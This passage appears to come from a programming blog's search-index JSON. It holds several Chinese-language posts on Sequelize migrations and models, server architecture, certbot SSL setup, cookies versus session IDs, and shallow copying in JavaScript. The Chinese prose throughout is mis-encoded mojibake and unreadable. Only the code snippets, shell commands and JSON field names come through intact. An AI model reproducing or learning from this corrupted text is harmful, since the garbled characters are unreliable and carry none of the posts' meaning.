å°±å¤§åŠŸå‘Šæˆå•¦ã€‚ ä½†æ˜¯é€™æ¨£é‚„æ²’æœ‰å®Œæˆï¼Œé‚„æœ‰ä¸€ä»¶äº‹æƒ…å¾—åšæ•…æ„ç”¨é€™éº¼å¤§çš„å­—å°±æ˜¯å› ç‚ºé€™ä»¶äº‹å¾ˆé‡è¦ï¼Œçµ•å°ä¸èƒ½å¿˜è¨˜ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œä¸è¦å¿˜è¨˜ Model çš„å­˜åœ¨ï¼Œç•¶ä½ ç”¨ JS ä¾†æ“ä½œè³‡æ–™åº«æ™‚éƒ½æ˜¯é€é Model ä¾†åŸ·è¡Œçš„ï¼Œæ‰€ä»¥é›–ç„¶ä½ å‰›å‰›é€é Migration åœ¨ Table æ–°å¢äº†æ¬„ä½ï¼Œä½†é€™ä¸¦ä¸ä»£è¡¨ Model çš„è³‡æ–™çµæ§‹æœƒè·Ÿè‘—è‡ªå‹•æ›´æ–°ï¼Œæ‰€ä»¥è«‹å‹™å¿…è¨˜å¾—ï¼š è·‘å®Œ Migration å¾Œè¦å†å»é‡æ–°è¨­å®š Model çš„è³‡æ–™çµæ§‹ è·‘å®Œ Migration å¾Œè¦å†å»é‡æ–°è¨­å®š Model çš„è³‡æ–™çµæ§‹ è·‘å®Œ Migration å¾Œè¦å†å»é‡æ–°è¨­å®š Model çš„è³‡æ–™çµæ§‹ é€™å¾ˆé‡è¦ï¼ŒçœŸçš„ã€‚ å¦‚æœä½ æ²’æœ‰é€™æ¨£åšçš„è©±ï¼Œå°±æœƒæœ‰é€™å€‹å•é¡Œï¼š 1234567const { Category } = require('./models');~async function () { // æ’ˆå‡ºæ‰€æœ‰è³‡æ–™ const categories = await Category.findAll(); console.log('result', JSON.stringify(categories, null, 4));}() è¼¸å‡ºçµæœï¼š 12345678910111213// æ²’æœ‰æŠŠ isDeleted æ’ˆå‡ºä¾†Executing (default): SELECT `id`, `name`, `createdAt`, `updatedAt` FROM `Categories` AS `Category`;result [ { \"id\": 1, \"name\": \"JavaScript\", \"createdAt\": \"2021-03-31T00:00:00.000Z\", \"updatedAt\": \"2021-03-31T00:00:00.000Z\" // æ¶ˆå¤±çš„ isDeleted }] æ‰€ä»¥å†èªªä¸€æ¬¡ï¼Œè¨˜å¾—å»æ”¹ Model çš„è³‡æ–™çµæ§‹ï¼š 12345678910111213141516171819'use strict';const { Model} = require('sequelize');module.exports = (sequelize, DataTypes) =&gt; { class Category extends Model { static associate(models) { Category.hasMany(models.Post); } } Category.init({ name: DataTypes.STRING, isDeleted: DataTypes.BOOLEAN, // &lt;- è£œä¸Šå‰›å‰›åŠ çš„æ¬„ä½ }, { sequelize, modelName: 'Category', }); return Category;}; ä¸€å®šè¦ç¢ºä¿ Model è·Ÿè³‡æ–™åº«çš„ç‹€æ…‹æ˜¯åŒæ­¥çš„ï¼Œåœ¨ç”¨çš„æ™‚å€™æ‰ä¸æœƒå‡ºå•é¡Œã€‚ é™„è¨» å¦‚æœæœ‰æ”¹ Migration çš„åç¨±çš„è©±ï¼Œè¨˜å¾—åˆ°è³‡æ–™åº«çš„ sequelizemeta æŠŠåŸæœ¬çš„åç¨±ä¹Ÿæ”¹æ‰ï¼Œä¸ç„¶åŸ·è¡ŒæŒ‡ä»¤æ™‚æœƒå‡ºéŒ¯ã€‚ æƒ³çŸ¥é“å…¶ä»–æ“ä½œå¯ä»¥åƒè€ƒ é€™ç¯‡ï¼Œä¸»è¦å°±æ˜¯æ›å€‹ method ä¾†åŸ·è¡Œè€Œå·²ï¼ŒåŸºæœ¬çµæ§‹éƒ½å¤§åŒå°ç•°ã€‚","link":"/2022/03/31/sequelize-use-migration/"},{"title":"ä¼ºæœå™¨æ¶æ§‹","text":"å¾Œç«¯çš„ä¸–ç•Œä¹Ÿæ˜¯åšå¤§ç²¾æ·±ã€‚ ç°¡è¿°é€™é‚Šæœƒè£œå……ä¸€äº›å¾Œç«¯ Server å¦‚ä½•é‹ä½œçš„ç›¸é—œçŸ¥è­˜ã€‚çœ‹å®Œå¾Œå¸Œæœ›ä½ èƒ½çŸ¥é“é€™äº›é—œéµå­—çš„æ¶µç¾©ï¼š NAT æ˜¯ä»€éº¼ Load Balance æ˜¯ä»€éº¼ Replication æ˜¯ä»€éº¼ NATï¼ˆNetwork Address Translationï¼‰ä¸€å€‹å…¬å¸è£¡é¢é€šå¸¸æœ‰å¾ˆå¤šå° Server åœ¨è·‘ï¼Œå¯æ˜¯ä½ å¯¦éš›è·Ÿ Server é€£ç·šæ™‚çœ‹èµ·ä¾†éƒ½åªæœ‰é€£åˆ°ä¸€å€‹å°è±¡ï¼Œé€™æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿ å…¶å¯¦é€™é‚Šè·Ÿã€Œå…§ç¶²ã€å’Œã€Œå¤–ç¶²ã€çš„æ¦‚å¿µå¾ˆåƒï¼Œå…¬å¸å…§çš„ Server å½¼æ­¤æœƒé€éå…§ç¶² IP ä¾†æºé€šï¼Œä½†å°å¤–è¦é€éä¸€å°ã€Œæ©Ÿå™¨ã€ä¾†è·Ÿå¤–é¢çš„ç¶²è·¯ä¸–ç•Œåšæºé€šï¼Œé€™å€‹æ©Ÿå™¨å°±æ˜¯ã€ŒNATã€ã€‚ é€™è£¡çš„ ä¾‹å­ ä¸éŒ¯ï¼Œç¯€éŒ„ä¸€æ®µå…§å®¹ï¼š å‡è¨­å°å¤§é›»æ©Ÿç³»çš„ç¶²ç®¡äººå“¡å°‡ç¶²è·¯åˆ‡å‰²ç‚ºå…§éƒ¨èˆ‡å¤–éƒ¨ï¼Œå…§éƒ¨ç¶²è·¯çš„ç¶²å€è¨­å®šç‚º 192.168.1.1ã€192.168.1.2ã€192.168.1.3ï¼›è€Œå¤–éƒ¨ç¶²è·¯çš„ç¶²å€ç‚º 140.112.66.88ï¼Œå‰‡ NAT ä¼ºæœå™¨çš„åŠŸèƒ½å°±æ˜¯æ›´æ”¹å°åŒ…è¡¨é ­çš„å‚³é€ç«¯ IP ä½å€èˆ‡æ¥æ”¶ç«¯ IP ä½å€ã€‚ æ‰€ä»¥å‘¢ï¼Œå¾å¤–ç¶²æ²’è¾¦æ³•çœ‹åˆ°è£¡é¢æœ‰å¹¾å° Serverï¼Œè€Œå…§ç¶²ä¹Ÿçœ‹ä¸åˆ°å¤–é¢çš„ä¸–ç•Œã€‚ æœ€å¾Œé™„å€‹æ‡¶äººåŒ…ï¼ŒNAT çš„åŠŸèƒ½æœ‰ä»€éº¼ï¼š é‡æ–°å°è£ IPï¼Œä¾‹å¦‚ 192.168.1.1 è®Šæˆ 140.112.66.88 å°åŒ…éæ¿¾ï¼Œå¯ä»¥æ””æˆªä¸€äº›æƒ¡æ„å°åŒ… è² è¼‰å‡è¡¡ï¼ŒæŠŠè³‡æºåˆ†æ•£åˆ°ä¸åŒ Serverï¼Œæ¸›è¼•è² æ“” è² è¼‰å‡è¡¡ï¼ˆLoad Balanceï¼‰ ç•¶æµé‡å¾ˆå¤§çš„æ™‚å€™ï¼ŒæŠŠæµé‡åˆ†æ•£åˆ°ä¸åŒçš„ Serverï¼Œæ¸›è¼•è² æ“”ã€‚ å¥½è™•æœ‰ï¼š æ¸›è¼• Server è² æ“” å¦‚æœ PHP01 çˆ†äº†ï¼Œé‚„æœ‰ PHP02 èƒ½æ’ è³‡æ–™åº« Replication è®€å¯«åˆ†é›¢ã€å¾å±¬æ¶æ§‹ ç°¡å–®ä¾†èªªï¼Œå¯ä»¥æŠŠè³‡æ–™åº«å»ºç«‹å¾å±¬é—œä¿‚ Master è² è²¬è™•ç†ã€Œå¯«å…¥è³‡æ–™ã€çš„è³‡æ–™åº« Slave è² è²¬è™•ç†ã€Œè®€å–ã€è³‡æ–™çš„è³‡æ–™åº« ç•¶ä½ åœ¨å¯«è³‡æ–™åˆ° Master æ™‚ï¼ŒMySQL æœƒé€é Replicationï¼ˆè¤‡è£½ï¼‰æ©Ÿåˆ¶ï¼Œè®“ Master å’Œæ‰€æœ‰ Slave ä¹‹é–“çš„è³‡æ–™åŒæ­¥ã€‚ é€™æ¨£çš„å¥½è™•æ˜¯è³‡æ–™åº«è² æ“”ä¸æœƒé‚£éº¼é‡ï¼Œå› ç‚ºã€Œè®€è·Ÿå¯«æ˜¯åˆ†é–‹çš„ã€ã€‚å¦å¤–é›–ç„¶ä¸Šé¢çš„åœ–åªç•«å‡ºä¸€å°ï¼Œä½†å¯¦éš›ä¸Š Master å’Œ Slave å¯ä»¥æœ‰å¤šå€‹ï¼ˆæ‡‰è©²å•¦ï¼‰ï¼Œæ‰€ä»¥åˆå¯ä»¥åœ¨é€éé€™ç¨®æ–¹å¼ä¾†é™ä½è² æ“”ã€‚ è³‡æ–™åº«é«˜å¯ç”¨æ€§ High Availability å…¶å¯¦å°±æ˜¯å‰›å‰›çš„å¾å±¬æ¶æ§‹ä¾†åšå»¶ä¼¸ï¼š å‡è¨­ Master å£æ‰äº†ï¼Œå°±å…ˆæŠŠæµé‡è½‰çµ¦ Slaveï¼Œåˆ©ç”¨é€™æ®µæœŸé–“ä¿®å¾© Masterã€‚ ç¸½ä¹‹å‘¢ï¼Œä¸ç®¡æ˜¯å‰é¢æçš„ Load Balance é‚„æ˜¯ Replicationï¼Œé‡é»éƒ½åªæœ‰ä¸€å€‹ï¼š æ°¸é è¦æœ‰å…©å°ä»¥ä¸Šçš„æ©Ÿå™¨ä¾†é é˜²çªç™¼ç‹€æ³ è¨˜ä½é€™é»å°±å¥½äº†ã€‚","link":"/2022/03/09/server-architecture/"},{"title":"è¨­å®š SSL æ†‘è­‰","text":"çµæœä¹Ÿæ²’é‚£éº¼è¤‡é›œã€‚ ç°¡è¿°æœ¬ä¾†æƒ³èªªæƒ³èªª SSL è¦éŒ¢ï¼ŒåŠ ä¸Šæˆ‘æ‡¶æ‰€ä»¥æ²’æ‰“ç®—å¼„ã€‚ä¸éå¾Œä¾†çœ‹åˆ° åŒå­¸å¯«çš„ç´€éŒ„ è£¡é¢æ­£å¥½æåˆ°ï¼š æœ‰ä¸€å€‹ç¶²ç«™å«åš lets encrypt å¯ä»¥å…è²»é ’ç™¼ SSL çš„è­‰æ›¸ï¼Œè€Œ certbot å°±æ˜¯å¯ä»¥å¹«ä½ è‡ªå‹•é€£åˆ° lets encrypt ç”³è«‹è­‰æ›¸ï¼Œç”šè‡³åœ¨éæœŸçš„æ™‚å€™ä¹Ÿæœƒè‡ªå‹•å¹«ä½ å†ç”³è«‹ï¼ï¼ç°¡ç›´æ˜¯ nice åˆ°ä¸è¡Œ æ‰€ä»¥å°±ä¾†å¹«è‡ªå·±çš„ç¶²ç«™è£œä¸Š SSL æ†‘è­‰äº†ã€‚ æ­¥é©Ÿå®˜ç¶²å…¶å¯¦å°±æœ‰ æ•™å­¸æ­¥é©Ÿ äº†ï¼Œä¸éä¿éšªèµ·è¦‹é‚„æ˜¯å¯«ä¸€ä¸‹å¥½äº†ï¼š å®‰è£ snapdï¼ˆEC2 çš„ Ubuntu å·²ç¶“æœ‰å…§å»ºï¼Œæ‰€ä»¥é€™æ­¥ç•¥éï¼‰ æ›´æ–° snapdï¼šsudo snap install core; sudo snap refresh core å®‰è£ Certbotï¼šsudo snap install --classic certbot ç¢ºèª Cerbot æŒ‡ä»¤å¯ä»¥ç”¨ï¼šsudo ln -s /snap/bin/certbot /usr/bin/certbot è¨­å®šè¦ä½¿ç”¨ SSL çš„ç¶²å€ï¼šsudo certbot --apache é‡æ–°å•Ÿå‹• Cerbotï¼šsudo certbot renew --dry-run æœ€å¾Œå°±èƒ½çœ‹åˆ°æœ‰é–é ­å›‰ï¼ è£œå……ï¼å¾Œä¾†æ–°å¢çš„å­ç¶²åŸŸä¹Ÿæƒ³åŠ ä¸Š SSL çš„è©±åŠ ä¸Š -d &lt;æ–°çš„å­ç¶²åŸŸ&gt;ï¼š 1sudo certbot --apache -d www.example.com é€™æ¨£å°±è¡Œå›‰ã€‚ä¸ç¢ºå®šä¸åŠ çš„è©±æ˜¯ä¸æ˜¯æœƒè‡ªå‹•è·³é¸é …çµ¦ä½ é¸ï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒå†è©¦çœ‹çœ‹å§ã€‚","link":"/2022/03/09/set-ssl/"},{"title":"Session èˆ‡ Cookie æ˜¯ä»€éº¼ï¼Ÿ","text":"æœ€è¿‘æƒ³è¦å¯¦ä½œã€Œæ”¶è—åˆ°æˆ‘çš„æœ€æ„›ã€çš„åŠŸèƒ½ã€‚ æåˆ°é€™å€‹åŠŸèƒ½ï¼Œæˆ‘è…¦ä¸­ç¬¬ä¸€å€‹æƒ³åˆ°çš„å°±æ˜¯ã€ŒWeb Storage APIã€ã€‚ä½†æ­£ç•¶æˆ‘æ‰“ç®—æ‰¾ç›¸é—œçš„è³‡æ–™ä¾†çœ‹æ™‚ï¼Œçªç„¶åˆæƒ³åˆ°å¥½åƒé‚„æœ‰å€‹å«ã€ŒCookie / Sessionã€çš„ç©æ„å…’ï¼Ÿ æ—¢ç„¶éƒ½æ±ºå®šè¦å­¸äº†ï¼Œé‚£ä¸å¦‚å°±ä¸€æ¬¡å¼„æ¸…æ¥šå§ï¼Œæ‰€ä»¥é€™æ¬¡åƒè€ƒäº† Huli çš„ æ–‡ç«  æƒ³ä¾†åšä¸€ä»½é—œæ–¼ã€ŒCookie / Sessionã€çš„ç­†è¨˜ã€‚ èªè­˜ç„¡ç‹€æ…‹è¦äº†è§£ç‚ºä»€éº¼éœ€è¦ Session èˆ‡ Cookie ä¹‹å‰ï¼Œè¦å…ˆçŸ¥é“ HTTP æ˜¯ä¸€ç¨®ã€Œç„¡ç‹€æ…‹ã€çš„å”è­°ã€‚ ä»€éº¼å«ç„¡ç‹€æ…‹ï¼Ÿç›´æ¥çœ‹ä¾‹å­ï¼š 1234ç€è¦½å™¨ï¼šå®‰å®‰ï¼Œæˆ‘æ˜¯ PeaNuï¼Œæˆ‘ç¾åœ¨è¦ç™»å…¥å“¦Serverï¼šå¥½ï¼Œä½ æ˜¯ PeaNuï¼Œä½ æˆåŠŸç™»å…¥äº†ã€‚ç€è¦½å™¨ï¼šæˆ‘æ˜¯PeaNuï¼Œæˆ‘æƒ³çœ‹çœ‹æˆ‘çš„è³¼ç‰©è»Šçš„å•†å“Serverï¼šä¸å¥½æ„æ€ï¼Œä½ å“ªä½ï¼Ÿ ä½ çœ‹ï¼Œæ¯ç•¶ä½ æƒ³è¦åšä¸‹ä¸€æ­¥çš„æ™‚å€™ï¼ŒServer å°±å·²ç¶“å¿˜è¨˜ä½ æ˜¯èª°äº†ã€‚æ›å¥è©±èªªï¼Œæ¯ä¸€æ¬¡çš„ Request éƒ½æ˜¯ä¸ç›¸é—œçš„ã€‚ PeaNu ç™»å…¥æ™‚æ˜¯ä¸€å€‹ Requestï¼Œè¦æŸ¥çœ‹è³¼ç‰©è»Šå•†å“ä¹Ÿæ˜¯ä¸€å€‹ Requestï¼Œä½†ä¸ç®¡ PeaNu ç™¼äº†å¹¾æ¬¡ Requestï¼Œå° Server è€Œè¨€ï¼Œæ¯ä¸€æ¬¡éƒ½æ˜¯ä¸€å€‹å…¨æ–°çš„ Requestï¼Œå› ç‚º Server æ²’è¾¦æ³•è¨˜ä½ç•¶æ™‚çš„ã€Œç‹€æ…‹ã€ã€‚ è§£æ•‘å¤±æ†¶ç—‡çš„å¥½å¤¥ä¼´ Sessionã€ŒSessionã€æ˜¯ä¸€å€‹å¯ä»¥è®“ Server è¨˜ä½æ¯ä¸€æ¬¡ Request ç‹€æ…‹çš„æ©Ÿåˆ¶ã€‚ å¯¦ä½œ Session çš„æ–¹å¼æœ‰å¾ˆå¤šç¨®ï¼Œå…¶ä¸­ä¸€ç¨®æ–¹æ³•æ˜¯ã€Œç¶²å€ã€ï¼š 12345ç€è¦½å™¨ï¼šæˆ‘è¦è²·è˜‹æœï¼ŒæŠŠè˜‹æœåŠ åˆ°è³¼ç‰©è»Š ( market.tw?item1=apple )ç€è¦½å™¨ï¼šæˆ‘è¦è²·è±¬æ’ï¼ŒæŠŠè±¬æ’åŠ åˆ°è³¼ç‰©è»Š ( market.tw?item1=apple&amp;item2=cutlet )ç€è¦½å™¨ï¼šæˆ‘è¦çµå¸³Serverï¼šæŸ¥çœ‹ç¶²å€å¾Œå¾—çŸ¥ï¼Œitem1=appleï¼ˆè˜‹æœï¼‰ï¼Œitem2=cutletï¼ˆè±¬æ’ï¼‰Serverï¼šå“¦ï¼ä½ è¦è²·è˜‹æœè·Ÿè±¬æ’ã€‚ å¦å¤–ä¸€ç¨®æ–¹å¼æ˜¯åˆ©ç”¨ ã€ŒCookieã€ã€‚ æ¯å€‹ç€è¦½å™¨éƒ½æœ‰ Cookie ï¼Œä¸€å€‹ç”¨ä¾†å„²å­˜è³‡æ–™çš„æ±è¥¿ã€‚ ç¾åœ¨å‡è¨­æ¯å€‹ç€è¦½å™¨éƒ½éš¨èº«æ”œå¸¶ä¸€å€‹å¹¸é‹é¤…ä¹¾ï¼ˆå¹¸é‹é¤…ä¹¾æ˜¯ç¾åœ‹çš„ä¸€ç¨®é¤…ä¹¾ï¼Œè£¡é¢é€šå¸¸æœƒå¡è‘—ä¸€å¼µç´™æ¢ï¼Œå¯ä»¥åƒè€ƒé€™è£¡ï¼‰ï¼š 123456789101112ç€è¦½å™¨ï¼šå—¨ï¼Œçµ¦æˆ‘ä¸€å€‹è±¬æ’Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ï¼Œæˆ‘å„²å­˜ä¸€ä¸‹è³‡æ–™Serverï¼šï¼ˆæŠŠç´™æ¢å¡åˆ°å¹¸é‹é¤…ä¹¾è£¡ï¼‰ï¼ˆset-Cookie: item1=apple)Serverï¼šOKã€‚ç€è¦½å™¨ï¼šé˜¿ï¼Œæˆ‘é‚„æƒ³è¦ä¸€å€‹è±¬æ’Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ï¼Œæˆ‘å„²å­˜ä¸€ä¸‹è³‡æ–™Serverï¼šï¼ˆæŠŠç´™æ¢å¡åˆ°å¹¸é‹é¤…ä¹¾è£¡ï¼‰ï¼ˆset-Cookie: item2=cutlet)ç€è¦½å™¨ï¼šå¥½äº†ï¼Œæˆ‘è¦çµå¸³ï¼ˆå¸¶è‘—å¹¸é‹é¤…ä¹¾ï¼‰Serverï¼šæŠŠå¹¸é‹é¤…ä¹¾æ‹†é–‹ã€‚ï¼ˆæ‰¾åˆ° apple è·Ÿ cutletï¼‰Serverï¼šå¥½çš„ï¼Œä½ çš„è˜‹æœè·Ÿè±¬æ’æ˜¯ 87 å…ƒå“¦ï¼ å¾ Cookie-based åˆ° Session Identifieråœ¨å‰é¢çš„ä¾‹å­è£¡ï¼Œæˆ‘å€‘æŠŠè³‡æ–™éƒ½å„²å­˜åœ¨ç€è¦½å™¨çš„ Cookie ä¸­ï¼Œé€™å€‹æ–¹æ³•ç¨±ç‚ºã€ŒCookie-based sessionï¼ˆä»¥ Cookie ç‚ºåŸºç¤çš„ Sessionï¼‰ã€ åœ¨ç†è§£ä»€éº¼æ˜¯ã€ŒSession Identifierã€ä¹‹å‰ï¼Œæˆ‘å€‘å¯ä»¥å…ˆæ€è€ƒä¸€ä¸‹ä½¿ç”¨ Cookie æœ‰ä»€éº¼å•é¡Œï¼Ÿç‚ºä»€éº¼æœƒæœ‰ Session Identifier çš„å‡ºç¾ï¼Ÿ æœ‰ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…è¦çŸ¥é“ï¼Œé‚£å°±æ˜¯ã€ŒCookie æ˜¯å¯ä»¥è¢«ç«„æ”¹çš„ã€ï¼š 1234ç€è¦½å™¨ï¼šå—¨ï¼Œæˆ‘è¦è²·å’–å•¡ï¼Œå¯„ 10 æ¯Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ï¼Œæˆ‘å„²å­˜ä¸€ä¸‹è³‡æ–™Serverï¼šï¼ˆæŠŠç´™æ¢å¡åˆ°å¹¸é‹é¤…ä¹¾è£¡ï¼‰ï¼ˆset-Cookie: coffee=10)Serverï¼šOKï¼Œæ­¡è¿ä¸‹æ¬¡å†ä¾†ã€‚ é€™å€‹æ™‚å€™ï¼Œå¦‚æœç€è¦½å™¨è‡ªå·±ä¿®æ”¹ Cookie çš„å€¼ï¼Œå°±æœƒè®Šæˆé€™æ¨£ï¼š 123456ç€è¦½å™¨ï¼šï¼ˆå°å¹¸é‹é¤…ä¹¾çš„ç´™æ¢å‹•æ‰‹è…³ï¼Œæ”¹æˆ coffee = 20ï¼‰ç€è¦½å™¨ï¼šå—¨ï¼Œæˆ‘ä¾†é ˜æˆ‘çš„å’–å•¡Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ç¢ºèªä¸€ä¸‹Serverï¼šæŠŠå¹¸é‹é¤…ä¹¾æ‹†é–‹ï¼ˆæ‰¾åˆ° coffee = 20ï¼‰Serverï¼šä½ ç›®å‰æœ‰ 20 æ¯å’–å•¡ï¼Œä½ æƒ³è¦é ˜å¹¾æ¯å‘¢ï¼Ÿç€è¦½å™¨ï¼šä»Šæ™šæˆ‘æƒ³ä¾†é»...æ˜Ÿå·´å…‹çš„å·§å…‹åŠ›å¯å¯ç¢ç‰‡æ˜Ÿå†°æ¨‚ä¸åŠ å·§å…‹åŠ›ã€‚å’³...æˆ‘æ˜¯èªªï¼Œ 1 æ¯å°±å¥½ ç‚ºäº†è§£æ±º Cookie è¢«æ“…è‡ªç«„æ”¹çš„å•é¡Œï¼Œç¬¬ä¸€å€‹æœƒç›´è¦ºæƒ³åˆ°çš„æ–¹æ³•æ˜¯ï¼šæŠŠ Cookie ä¸­çš„è³‡æ–™åšåŠ å¯†è™•ç†ã€‚ æ‰€ä»¥ Server åœ¨è¨­ç½® Cookie çš„æ™‚å€™ï¼Œå¯ä»¥å…ˆç”¨ä¸€å€‹åŠ å¯†çš„æ–¹å¼ä¾†ç”¢ç”Ÿè³‡æ–™ï¼Œå†æŠŠåŠ å¯†éå¾Œçš„è³‡æ–™å­˜åˆ° Cookie è£¡ï¼š 12345ç€è¦½å™¨ï¼šå—¨ï¼Œæˆ‘è¦è²·å’–å•¡ï¼Œå¯„ 10 æ¯Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ï¼Œæˆ‘å„²å­˜ä¸€ä¸‹è³‡æ–™Serverï¼šï¼ˆæŠŠç´™æ¢å¡åˆ°å¹¸é‹é¤…ä¹¾è£¡ï¼‰ï¼ˆset-Cookie: coffee=ED85B89167A84B631C10B046B5FB7FC0)Serverï¼šOKï¼Œæ­¡è¿ä¸‹æ¬¡å†ä¾†ã€‚ç€è¦½å™¨ï¼šGG é€™æ™‚å€™å¦‚æœç€è¦½å™¨æƒ³è¦ç«„æ”¹ Cookie çš„å€¼ï¼Œå°±å¾—å…ˆç ´è§£é€™å¥—åŠ å¯†çš„æ¼”ç®—æ³•ï¼Œæ‰æœ‰è¾¦æ³•åšä¿®æ”¹ã€‚ é€™æ¨£çš„åšæ³•ç¢ºå¯¦è§£æ±ºäº† Cookie è¢«æ“…è‡ªç«„æ”¹çš„å•é¡Œï¼Œä½†é€™ä¾èˆŠå±¬æ–¼ Cookie-based sessionã€‚ é€™æ¨£å­åšæœ‰ä»€éº¼å•é¡Œå—ï¼Ÿå¯¦éš›ä¸Šæ˜¯æœ‰çš„ï¼Œå› ç‚º Cookie èƒ½å¤ å„²å­˜çš„è³‡æ–™é‡æ˜¯æœ‰é™çš„ï¼ˆ4KBï¼‰ï¼Œæ‰€ä»¥ç•¶è¦å„²å­˜åœ¨ Cookie çš„è³‡æ–™è¶Šä¾†è¶Šå¤šæ™‚ï¼Œå¾ˆå®¹æ˜“å°±æœƒè¶…å‡ºä¸Šé™å€¼ã€‚ ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œï¼Œã€ŒSession Identifierã€å°±èª•ç”Ÿäº†ã€‚ å®ƒèƒŒå¾Œçš„åŸç†æ˜¯é€™æ¨£å­ï¼š Server ç¾åœ¨ä¸æŠŠè³‡æ–™å„²å­˜åœ¨ç€è¦½å™¨çš„ Cookie äº†ï¼Œè€Œæ˜¯éƒ½å„²å­˜åœ¨ Server é€™é‚Šã€‚è‡³æ–¼ Cookie å‰‡åªæœƒå„²å­˜ä¸€å€‹ç”¨ä¾†è¾¨è­˜èº«åˆ†çš„è­˜åˆ¥ç¢¼ï¼Œé€éé€™å€‹è­˜åˆ¥ç¢¼ï¼ŒServer å°±å¯ä»¥åœ¨è‡ªå·±çš„è¨˜äº‹æœ¬ä¸Šæ‰¾åˆ°å°æ‡‰çš„è³‡æ–™ã€‚ 1234ç€è¦½å™¨ï¼šå—¨ï¼Œæˆ‘è¦è²·å’–å•¡ï¼Œå¯„ 10 æ¯Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ï¼Œæˆ‘å„²å­˜ä¸€ä¸‹è³‡æ–™Serverï¼šï¼ˆæŠŠç´™æ¢å¡åˆ°å¹¸é‹é¤…ä¹¾è£¡ï¼‰ï¼ˆset-SessionId: A59Uhe7I94J330mN )Serverï¼šï¼ˆåœ¨è‡ªå·±çš„è¨˜äº‹æœ¬ä¸Šå¯«ä¸‹ï¼šA59Uhe7I94J330mN : coffee=10ï¼‰ ç•¶ä¸‹ä¸€æ¬¡ç€è¦½å™¨ä¾†é ˜å’–å•¡æ™‚ï¼š 12345ç€è¦½å™¨ï¼šå—¨ï¼Œæˆ‘ä¾†é ˜æˆ‘çš„å’–å•¡Serverï¼šå¥½ï¼Œå¹¸é‹é¤…ä¹¾å€Ÿæˆ‘ç¢ºèªä¸€ä¸‹å“¦Serverï¼šæŠŠå¹¸é‹é¤…ä¹¾æ‹†é–‹ï¼ˆæ‰¾åˆ° A59Uhe7I94J330mN )Serverï¼šæ‰“é–‹è‡ªå·±çš„è¨˜äº‹æœ¬åšæŸ¥é–±ï¼ˆæ‰¾åˆ° A59Uhe7I94J330mN : coffee=10ï¼‰Serverï¼šå¥½çš„ï¼Œä½ ç›®å‰æœ‰ 10 æ¯å’–å•¡ï¼Œä½ æƒ³è¦å¹¾æ¯å‘¢ï¼Ÿ å„²å­˜åœ¨ Cookie ä¸­çš„è­˜åˆ¥ç¢¼ç¨±ç‚ºã€ŒSessionIDã€ã€‚ é€™æ¨£å­å°±è§£æ±ºäº† Cookie å¤§å°é™åˆ¶çš„å•é¡Œï¼Œå› ç‚ºä¸è«–æœ‰å¤šå°‘è³‡æ–™è¦å„²å­˜ï¼Œcookie å”¯ä¸€è¦å„²å­˜çš„è³‡æ–™éƒ½åªæœ‰è­˜åˆ¥ç¢¼ï¼ˆSessionIdï¼‰ã€‚ ä¸éæœ‰ä¸€é»è¦ç‰¹åˆ¥æé†’çš„æ˜¯ï¼šServer åªèª SessionId ä¸èªäººã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä¸ç®¡æ˜¯èª°ï¼Œåªè¦ä»–çš„ Cookie ä¸­çš„ SessionId å¯ä»¥å°æ‡‰åˆ° Server ä¸­å„²å­˜çš„è³‡è¨Šï¼Œé‚£ä»–å°±å¯ä»¥å–å¾—ç›¸å°æ‡‰çš„è³‡æ–™ã€‚ ç¸½çµæœ€å¾Œï¼Œè©¦è‘—å•è‡ªå·±é€™äº›å•é¡Œï¼Œçœ‹çœ‹è‡ªå·±æœ‰æ²’æœ‰çœŸçš„ç†è§£ï¼š HTTP çš„ç„¡ç‹€æ…‹æ˜¯ä»€éº¼æ„æ€ï¼Ÿ Session æ˜¯ç”¨ä¾†åšä»€éº¼çš„ï¼Ÿ æ€éº¼å¯¦ä½œ sessionï¼Ÿ Cookie-base Session è·Ÿ Cookie æœ‰ä»€éº¼å·®ç•°ï¼Ÿ Cookie-base Session æœƒæœ‰ä»€éº¼å•é¡Œï¼Œsession Identifier åˆæ˜¯ç”¨ä¾†è§£æ±ºä»€éº¼å•é¡Œï¼Ÿ ç­”æ¡ˆéƒ½åœ¨å…§æ–‡è£¡äº†ï¼Œå¦‚æœå¿˜è¨˜äº†å°±åœ¨å»è£¡é¢æ‰¾ç­”æ¡ˆå§ã€‚ åƒè€ƒè³‡æ–™MDN-Web Storage APIç™½è©± Session èˆ‡ Cookieï¼šå¾ç¶“ç‡Ÿé›œè²¨åº—é–‹å§‹","link":"/2021/12/08/session-and-cookie/"},{"title":"å†ä¾†è«‡è«‡ï¼æ·ºæ‹·è²èˆ‡æ·±æ‹·è²çš„é›·","text":"åˆè¢«é›·åˆ°äº†ã€‚ ç°¡è¿°é€™æ˜¯æœ€è¿‘åœ¨å¯« React æ™‚è¸©åˆ°çš„é›·ï¼Œæœ¬ä¾†é‚„ä»¥ç‚ºæˆ‘å°æ‹·è²å•é¡Œæ²’æœ‰å¤ªå¤§çš„éšœç¤™æ‰å°ï¼Œçµæœé‚„æ˜¯å¤ªå¤§æ„æƒ¹ï¼Œæ‰€ä»¥é‡æ–°å›ä¾†è¤‡ç¿’ä¸€éã€‚ æƒ…å¢ƒé€™é‚Šç”¨ä¸€å€‹ä¾‹å­ä¾†èˆ‰ä¾‹æœƒæ¯”è¼ƒå¥½æ‡‚ä¸€é»ï¼š 1const a = [{value: 10}] å‡è¨­æˆ‘æƒ³è¦å¤šåŠ ä¸€å€‹è®Šæ•¸ bï¼Œä»–çš„å€¼è¦æ˜¯ [{value: 20}]ï¼Œé‚£ä½ æœƒæ€éº¼åšï¼Ÿ ç•¶æ™‚çš„æˆ‘æ˜¯é€™æ¨£åšçš„ï¼š 123const a = [{value: 10}]const b = [...a]b[0].value = 20 å¦‚æœä½ 